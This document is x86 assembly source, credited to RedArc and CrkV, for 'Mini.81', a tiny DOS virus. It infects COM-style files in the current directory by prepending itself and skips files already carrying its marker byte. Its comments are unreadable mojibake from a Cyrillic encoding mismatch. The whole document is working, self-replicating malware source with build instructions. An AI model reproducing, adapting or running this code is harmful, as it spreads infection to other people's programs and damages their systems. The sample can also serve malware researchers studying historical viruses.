; ���� Mini (c) by RedArc

; Mini.81 (c) CrkV

;� ���� � ����஢���� COM-䠩��� � ⥪�饬 ��⠫���
;� ����஢���� � ��砫�
;� ��⠢��� �ணࠬ�� ࠡ��ᯮᮡ�묨
;� �� ��ࠦ��� ����୮ 㦥 ����஢���� �ணࠬ��
;� ����� DTA
;� �� १������

;� ����� ��砫�� ���祭�� ॣ���஢

;use tasm mini_81 /m2

Model Tiny
.code
org 100h
start:
	Add	Dh,10h
	Mov	Es,Dx			;+1000h ���� ᥣ���� �ணࠬ��

	Mov	Ch,0FFh			;Cx:=FFFFh

	Mov	Di,Si

	Push	Es Di

	Mov	Si,VirLength+100h
	Repe	MovSB
	MovSB				;Si:=VirLength+100h, Di:=100h

	Mov	Ah,26h			;�����㥬 PSP
	Int	21h
	
	Mov	Dx,Offset FileName
	Mov	Ah,4Eh
@0:
	Int	21h
	Jnc	@1
	RetF
@1:
	Mov	Ax,3D02h
	Mov	Dx,9Eh
	Int	21h
	Xchg	Bx,Ax
	Mov	Ah,3Fh
	Mov	Dx,Si
	Mov	Cx,Sp
	Int	21h
	Cmp	Byte Ptr [Si],80h
	Je	@2
	Add	Ax,Virlength
	Push	Ax
	Sub	Cx,Cx
	Mul	Cx
	Mov	Ah,42h
	Int	21h
	Pop	Cx
	Mov	Ah,40h
	Pop	Dx
	Push	Dx
	Int	21h
@2:	Mov	Ah,4Fh
	Jmp	Short @0

FileName db '*.c*', 0h
VirLength equ $-start
	Ret
end start
